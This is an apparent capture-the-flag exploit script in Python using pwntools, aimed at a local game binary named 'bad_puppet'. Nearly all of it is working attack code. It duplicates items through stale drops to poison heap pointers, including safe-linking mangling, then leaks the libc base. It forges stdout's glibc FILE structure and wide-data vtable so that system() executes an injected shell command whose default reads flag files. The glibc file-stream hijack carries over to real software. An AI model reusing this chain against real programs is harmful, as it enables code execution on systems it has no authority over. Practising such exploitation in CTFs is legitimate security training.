import sys, time, struct
from pwn import *
from game import Game

HOST, PORT = "127.0.0.1", 32821
LIBC_STDOUT = 0x2055C0
LIBC_STDERR = 0x2054E0
LIBC_STDIN  = 0x2048E0
LIBC_WFILE  = 0x203228
UNSORTED_OFF = 0x204B20

def p64(x): return (x & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
def mangle(base, target): return (target ^ (base >> 12)) & 0xFFFFFFFFFFFFFFFF

class S:
    def __init__(self, g): self.g = g
    def solve(self, drop_id=None, mirror_id=None, mirror_kind=None, tries=3, buy=False):
        g = self.g
        for t in range(tries):
            items = g.inv(); n = len(items)
            for s in range(n):
                it = items[s]; mir = n - 1 - s
                if drop_id is not None and it["id"] != drop_id: continue
                m = items[mir]
                if mirror_id is not None and m["id"] != mirror_id: continue
                if mirror_kind == "ring" and m["type"] != "Ring": continue
                if mirror_kind == "nonring" and m["type"] == "Ring": continue
                return s
            g.cmd("inv sort", 0.3)
        if buy:
            g.cmd("shop buy 1 1", 0.5)
            return self.solve(drop_id, mirror_id, mirror_kind, 2, False)
        return None

def main():
    argv = sys.argv[1:]
    remote_mode = "remote" in argv
    cmdstr = "id;cat /flag*>/proc/self/fd/4"
    for a in argv:
        if a.startswith("cmd="): cmdstr = a[4:]
    if "attach" in argv:
        context.log_level="error"
        g = Game.__new__(Game)
        g.proc=None; g.dead=False; g.buf=b""; g.remote_mode=False
        g.io = remote("127.0.0.1", 31337, timeout=10)
        import time as _t; _t.sleep(0.4); g.drain(0.8)
    else:
        g = Game(host=HOST, port=PORT) if remote_mode else Game(mode="socket")
    sv = S(g)
    g.game_setup()
    made = 0
    for k in range(15):
        if g.dup_ring() is None: break
        made += 1
    rings = [i for i in g.inv() if i["type"] == "Ring"]
    print("[*] dups:", made, "rings:", len(rings))
    if len(rings) < 16: print("[-] few rings"); return
    for k in range(9):
        if g.equip_sell() is None: break
    eqs, _ = g.world()
    libc = None
    for e in eqs:
        for v in (e["head"], e["key"]):
            if v and 0x700000000000 <= v < 0x800000000000:
                cand = v - UNSORTED_OFF
                if cand & 0xFFF == 0: libc = cand
    libcel = ELF("/home/ubuntu/pwn/bp/bad_puppet/libs/libc.so.6", checksec=False)
    system = libc + libcel.symbols["system"]
    S_ = libc + LIBC_STDOUT
    print("[*] libc:", hex(libc), "stdout:", hex(S_), "system:", hex(system))

    cmdb = cmdstr.encode() + b"\0"
    assert len(cmdb) <= 0x20
    payA = bytearray(127); payA[0:len(cmdb)] = cmdb; payA[0x40:0x48] = p64(1)
    if "chain" in argv: payA[0x68:0x70] = p64(0x41414141)
    payA[0x28:0x30] = p64(1)   # narrow _IO_write_ptr > _IO_write_base (mode gets -1'd before flush)
    payB = bytearray(127)
    def setb(buf, off, val): buf[off-0x80:off-0x80+8] = p64(val)
    setb(payB, 0x88, libc + 0x206710)   # _lock so fflush() can lock
    setb(payB, 0x90, system)            # V+0x68 -> system
    setb(payB, 0xA0, S_ + 0x08)         # _wide_data = W (W+0x18=S+0x20 .. W+0xE0=S+0xE8)
    setb(payB, 0xC0, 0)                 # _mode <= 0 -> narrow flush clause
    setb(payB, 0xD8, libc + LIBC_WFILE) # vtable -> _IO_wfile_jumps
    setb(payB, 0xE0, S_ + 0x28)         # W+0xE0 = _wide_vtable = V
    setb(payB, 0xE8, S_ + 0x28)   # W+0xE0 = _wide_vtable = V (V+0x68 = S+0x90 -> system)

    X = [i for i in g.inv() if i["type"] == "Ring"][0]

    def cycle(payload, Tfixed=None, TofX_term=False, tag=""):
        xi = [i for i in g.inv() if i["id"] == X["id"]][0]["idx"]
        g.cmd("inv equip %d" % xi, 0.3)
        eqs, _ = g.world()
        if eqs[-1]["addr"] is None: print("[-] X equip fail"); return None
        xd = eqs[-1]["idx"]; xaddr = eqs[-1]["addr"]
        T = xaddr if TofX_term else Tfixed
        pl = bytearray(payload)
        if TofX_term:
            pl[0:8] = p64(xaddr >> 12)
        r = g.cmd("mw whisper %d %s" % (xd, bytes(pl).hex()), 0.35)
        if b"whispered to ring" not in r: print("[-] X whisper fail", r[:150]); return None
        g.cmd("inv unequip %d" % xi, 0.3)
        dests = []
        for k in range(2):
            cand = [i for i in g.inv() if i["type"] == "Ring" and i["id"] != X["id"]]
            if not cand: print("[-] no fill ring"); return None
            R = cand[0]
            g.cmd("inv equip %d" % R["idx"], 0.3)
            eqs, _ = g.world()
            if eqs[-1]["addr"] is None: print("[-] fill equip fail"); return None
            dests.append((eqs[-1]["idx"], eqs[-1]["addr"]))
            s = sv.solve(drop_id=R["id"], mirror_kind="nonring", buy=True)
            if s is None: print("[-] no fill slot"); return None
            ok, rid, rtyp = g.stale_drop(s)
            if not ok: print("[-] fill stale fail"); return None
            if rtyp == "Ring": print("[!] fill mirror was ring id=%s" % rid)
        hd, ha = dests[1]
        j = bytearray(127); j[0:8] = p64(mangle(ha, T))
        g.cmd("mw whisper %d %s" % (hd, bytes(j).hex()), 0.35)
        for k in range(2):
            s = sv.solve(mirror_id=X["id"], mirror_kind="ring", buy=True)
            if s is None: print("[-] no dup slot"); return None
            ok, rid, rtyp = g.stale_drop(s)
            if not ok: print("[-] dup stale fail"); return None
            if rid != X["id"]: print("[!] dup mirror mismatch: got %s want %s (%s)" % (rid, X["id"], rtyp))
        print("[*] cycle %s done T=%s" % (tag, hex(T)))
        return T

    cycle(bytes(payA), Tfixed=S_, tag="A")
    cycle(bytes(payB), Tfixed=S_ + 0x80, tag="B")
    cycle(bytes(127), TofX_term=True, tag="cleanup")
    try:
        pid = g.proc.pid
        mem = open("/proc/%d/mem" % pid, "rb", 0)
        def q(a):
            mem.seek(a); return struct.unpack("<Q", mem.read(8))[0]
        mem.seek(S_); print("[*] stdout now:", mem.read(0x20)[:16].hex())
        mem.seek(S_+0x20); d2 = mem.read(0x100)
        for o2 in range(0, 0x100, 16):
            print("     +%#04x: %s" % (0x20+o2, " ".join("%016x" % struct.unpack("<Q", d2[o2+i:o2+i+8])[0] for i in (0,8))))
        la = q(libc + 0x2054c0)
        print("[*] _IO_list_all =", hex(la), "chain=", hex(q(la + 0x68)))
        print("    stderr.mode=", struct.unpack("<i", mem.read(0) or b"\0"*4)[0] if False else "", "stdout.flags=%#x mode=%d wptr=%#x wbase=%#x wd=%#x vt=%#x" % (
            struct.unpack("<I", (mem.seek(S_) or mem.read(4)))[0],
            struct.unpack("<i", (mem.seek(S_+0xC0) or mem.read(4)))[0],
            q(S_+0x28), q(S_+0x20), q(S_+0xA0), q(S_+0xD8)))
    except Exception as e: print("memerr", e)
    print("[*] quit")
    g.cmd("quit", 0.4)
    d = g.drain(2.0)
    print("=== OUT ===")
    sys.stdout.write(d.decode(errors="replace"))
    try:
        print("[*] exit:", g.proc.poll())
        tail = g.proc.recvall(timeout=2)
        print("   tail:", tail[-300:])
    except Exception as e:
        print("err", e)

main()
